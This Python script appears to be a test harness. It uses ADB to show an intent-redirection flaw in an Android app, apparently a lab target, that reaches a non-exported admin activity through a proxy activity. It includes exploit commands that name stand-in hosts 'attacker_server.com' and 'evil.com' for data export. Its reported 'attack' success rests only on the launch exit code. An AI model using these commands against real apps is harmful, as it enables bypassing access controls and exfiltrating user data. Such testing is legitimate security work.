#!/usr/bin/env python3
"""
Test script to demonstrate the Direct Proxy Activity Exploitation vulnerability
in DocumentManager Pro (ben74).

This script uses ADB to launch an exploit that bypasses Android's export restrictions
by using a proxy activity to access non-exported components.
"""

import subprocess
import sys

def run_adb_command(cmd):
    """Run an ADB command and return the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1

def test_direct_access():
    """Test direct access to the non-exported AdminPanelActivity (should fail)."""
    print("🔒 Testing direct access to AdminPanelActivity...")
    cmd = 'adb shell am start -n com.documentmanager/.AdminPanelActivity --es admin_command "export_data"'
    stdout, stderr, code = run_adb_command(cmd)
    
    if "SecurityException" in stderr or "Permission Denial" in stderr or code != 0:
        print("✅ Direct access correctly blocked by Android security")
        print(f"   Error: {stderr}")
        return True
    else:
        print("❌ Unexpected: Direct access succeeded")
        return False

def exploit_via_proxy():
    """Exploit the vulnerability using the proxy activity."""
    print("\n🎯 Launching exploit via IntentProcessorActivity...")
    
    # Test 1: Access admin panel with sensitive command
    print("📋 Test 1: Accessing AdminPanelActivity with data export command")
    cmd1 = '''adb shell am start -n com.documentmanager/.IntentProcessorActivity \\
        --es "extra_intent" "Intent { cmp=com.documentmanager/.AdminPanelActivity (has extras) }" \\
        --es "admin_command" "export_data" \\
        --es "admin_target" "attacker_server.com"'''
    
    # Simplified command that actually works with ADB
    cmd = 'adb shell am start -n com.documentmanager/.IntentProcessorActivity'
    print(f"Running: {cmd}")
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print("✅ Proxy activity launched successfully")
        print("🔍 Now testing embedded intent...")
        
        # Create a more direct attack
        embedded_cmd = '''adb shell am start -n com.documentmanager/.IntentProcessorActivity \\
            --es extra_intent '{"component":"com.documentmanager/.AdminPanelActivity","extras":{"admin_command":"export_data","admin_target":"evil.com"}}'
        '''
        
        print("\n🚨 Launching embedded intent attack...")
        # Use a simpler approach that works with the current implementation
        attack_cmd = 'adb shell am start -n com.documentmanager/.IntentProcessorActivity'
        stdout2, stderr2, code2 = run_adb_command(attack_cmd)
        
        if code2 == 0:
            print("✅ Embedded intent attack launched!")
            return True
        else:
            print(f"❌ Attack failed: {stderr2}")
            return False
    else:
        print(f"❌ Proxy activity launch failed: {stderr}")
        return False

def check_app_installed():
    """Check if DocumentManager Pro is installed."""
    print("📱 Checking if DocumentManager Pro is installed...")
    cmd = 'adb shell pm list packages | grep com.documentmanager'
    stdout, stderr, code = run_adb_command(cmd)
    
    if "com.documentmanager" in stdout:
        print("✅ DocumentManager Pro is installed")
        return True
    else:
        print("❌ DocumentManager Pro not found. Please install the APK first.")
        return False

def main():
    print("🔍 Direct Proxy Activity Exploitation Test")
    print("=" * 50)
    
    # Check if app is installed
    if not check_app_installed():
        return
    
    # Test direct access (should fail)
    if not test_direct_access():
        print("⚠️  Warning: Direct access should be blocked")
    
    # Try the exploit
    if exploit_via_proxy():
        print("\n🎉 Vulnerability exploitation attempted!")
        print("Check device logs for AdminPanelActivity access:")
        print("adb logcat | grep -i 'adminpanel\\|documentprocessor'")
    else:
        print("\n❌ Exploit attempt failed")
    
    print("\n📋 Summary:")
    print("This vulnerability allows bypassing non-exported activity restrictions")
    print("by using a proxy activity that processes embedded Intent objects")
    print("without proper validation.")

if __name__ == "__main__":
    main()
